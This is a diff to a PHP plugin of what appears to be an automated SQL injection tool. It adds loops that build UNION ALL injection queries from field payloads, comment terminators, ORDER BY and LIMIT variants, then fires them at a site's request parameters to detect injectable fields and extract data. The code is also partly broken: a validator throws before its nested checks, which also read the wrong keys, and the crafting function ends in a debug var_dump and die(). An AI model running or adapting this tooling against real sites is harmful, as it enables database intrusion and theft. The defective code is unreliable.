@@ -39,7 +39,26 @@
 
 				}
 
-				$this->detectUnionInjection("unionQuery","CONCAT($hexOpen,%value%,$hexClose)");
+				$sqliParams	=	array(
+					"space-char"		=>	" ",
+					"field-payloads"	=>	explode('_',$this->_config["field-payloads"]),
+					"ending-payloads"	=>	array(
+						"comment"=>explode('_',$this->_config["comment-payloads"]),
+						"order"=>array(
+							array("by"=>"1","sort"=>"DESC"),
+							array("by"=>"1","sort"=>"ASC"),
+							array()
+						),
+						"limit"=>array(
+							array(),
+							array("0","1"),
+							array("1","1"),
+						)
+					)
+
+				);
+
+				$this->detectUnionInjection($sqliParams,"unionQuery","CONCAT($hexOpen,%value%,$hexClose)");
 
 				if(sizeof($this->_injection)){
 
@@ -54,14 +73,52 @@
 
 			}
 
-			private function detectUnionInjection($callback,$wrapping=NULL,$value=NULL){
 
-				$fieldPayloads		=	explode('_',$this->_config["field-payloads"]);
-				$commentPayloads	=	explode('_',$this->_config["comment-payloads"]);
+			private function checkUnionInjectionParameters(Array &$sqliParams){
+
+				if(!isset($sqliParams["field-payloads"])||!is_array($sqliParams["field-payloads"])){
+					throw(new \Exception("Invalid field payloads!"));
+				}
+
+				if(!isset($sqliParams["ending-payloads"])||!is_array($sqliParams["ending-payloads"])){
+
+					throw(new \Exception("Invalid ending payloads!"));
+
+					if(!isset($sqliParams["comment"])||!is_array($sqliParams["comment"])){
+
+						throw(new \Exception("Comment payloads key inside the ending-payloads array should be an array!"));
+
+					}elseif(!isset($sqliParams["order"])){
+
+						$sqliParams["order"]	=	array();
+
+					}elseif(!isset($sqliParams["limit"])){
+
+						$sqliParams["limit"]	=	array();
+
+					}
+
+				}
+
+			}
+
+			private function makeImpossibleValue($value){
+
+				if(is_numeric($value)){
+					return '9e99';
+				}
+
+				return md5(rand()*time());
+
+			}
+
+			private function detectUnionInjection(Array $sqliParams,$callback=NULL,$wrapping=NULL,$value=NULL){
+
+				$this->checkUnionInjectionParameters($sqliParams);
 
 				$requestVariables	=	$this->_httpAdapter->getUrl()->getQueryAsArray();
 
-				foreach($requestVariables as $requestVariable=>$value){
+				foreach($requestVariables as $requestVariable=>$requestVariableValue){
 
 					$iterationContainer	=	array();
 
@@ -69,71 +126,92 @@
 
 						$iterationContainer[]	=	(!empty($value))	?	$value	:	$maxFields;
 
-						foreach($fieldPayloads as $payLoad){
+						foreach($sqliParams["field-payloads"] as $payLoad){
 
-							foreach($commentPayloads as $comment) {
+							foreach($sqliParams["ending-payloads"]["comment"] as $comment) {
 
-								$queryBuilder	=	new \aidSQL\core\QueryBuilder();
+								foreach($sqliParams["ending-payloads"]["order"] as $order){
 
-								if(!empty($wrapping)){
-									$values	=	$queryBuilder->wrapArray($iterationContainer,$wrapping);
-								}else{
-									$values	=	$iterationContainer;
-								}
+									foreach($sqliParams["ending-payloads"]["limit"] as $limit){
 
-								$queryBuilder->union($values,"ALL");
-								$queryBuilder->setCommentOpen($comment);
+										$queryBuilder	=	new \aidSQL\core\QueryBuilder();
 
-								$space	=	$queryBuilder->getSpaceCharacter();
+										if(!empty($wrapping)){
+											$values	=	$queryBuilder->wrapArray($iterationContainer,$wrapping);
+										}else{
+											$values	=	$iterationContainer;
+										}
 
-								$sql		=	$value.$space."OR".$space."1=1"."$space$payLoad$space".$queryBuilder->getSQL().$comment;
-								$queryBuilder->setSQL($sql);
+										$queryBuilder->setCommentOpen($comment);
+										$queryBuilder->union($values,"ALL");
 
-								if($isVulnerable	=	$this->query($queryBuilder,$requestVariable,$callback)){
+										if(sizeof($order)){
 
-									$this->_injection	=	array(
-																		"index"				=>	$maxFields,	
-																		"fieldValues"		=>	$iterationContainer,
-																		"requestVariable"	=>	$requestVariable,
-																		"requestValue"		=>	$value,
-																		"fieldPayload"		=>	$payLoad,
-																		"comment"			=>	$comment,
-																		"wrapping"			=>	$wrapping,
-																		"data"				=>	$isVulnerable,
-																		"callback"			=>	$callback
+											$queryBuilder->orderBy($order["by"],$order["sort"]);
+
+										}
+
+										if(sizeof($limit)){
+
+											$queryBuilder->limit($limit);
+
+										}
+
+										$space			=	$queryBuilder->getSpaceCharacter();	
+										$madeUpValue	=	$this->makeImpossibleValue($requestVariableValue);
+										$sql				=	$madeUpValue.$payLoad.
+																$space.$queryBuilder->getSQL().$comment;
+
+										$queryBuilder->setSQL($sql);
+
+										if($isVulnerable	=	$this->query($queryBuilder,$requestVariable,$callback)){
+
+											$this->_injection	=	array(
+																				"index"				=>	$maxFields,	
+																				"fieldValues"		=>	$iterationContainer,
+																				"requestVariable"	=>	$requestVariable,
+																				"requestValue"		=>	$value,
+																				"wrapping"			=>	$wrapping,
+																				"data"				=>	$isVulnerable,
+																				"value"				=>	$madeUpValue,
+																				"payload"			=>	$payLoad,		//constant
+																				"limit"				=>	$limit,			//variable 
+																				"order"				=>	$order,			//variable
+																				"comment"			=>	$comment,		//constant
+																				"callback"			=>	$callback
 	
-									);
+											);
 
-									return TRUE;
+											return TRUE;
 
-								}
+										}
 
-							}
+									}	//limit
 
-						}
+								}	//order
 
-					}
+							}	//comment
 
-					$url	=	$this->_httpAdapter->getUrl();
-					$url->addRequestVariable($variable,$value); 
-					$this->_httpAdapter->setUrl($url);
+							$url	=	$this->_httpAdapter->getUrl();
+							$url->addRequestVariable($requestVariable,$value); 
+							$this->_httpAdapter->setUrl($url);
 
-				}
+						}	//field-payload
+
+					}	//maxfields
+
+				}	//requestVariables
 
 				return FALSE;
 
 			}
 
 			private function unionQuery($value){
+
 				$this->_verbose=1;
-				return $this->query($this->craftUnionInjection($value),$this->_injection["requestVariable"],__FUNCTION__);
-
-			}
-
-			private function craftUnionInjection($value){
 
 				$params			=	&$this->_injection;
-	
+
 				$queryBuilder	=	new \aidSQL\core\QueryBuilder();
 
 				foreach($params["fieldValues"] as &$val){
@@ -144,13 +222,20 @@
 
 				$queryBuilder->union($params["fieldValues"],"ALL");
 
+				if(isset($params["order"]["by"])){
+					$queryBuilder->orderBy($params["order"]["by"],$params["order"]["sort"]);
+				}
+
+				if(isset($params["limit"])){
+					$queryBuilder->limit($params["limit"]);
+				}
+
 				$sql	=	$queryBuilder->getSQL();
-				$sql	=	$params["requestValue"]." OR 1=1 ".$params["fieldPayload"].$sql.$params["comment"];
 
+				$sql	=	$params["requestValue"].$params["payload"]." ".$sql.$params["comment"];
 				$queryBuilder->setSQL($sql);
-
-				return $queryBuilder;
-
+				var_dump($queryBuilder);
+				die();
 			}
 
 			public function getPluginName(){
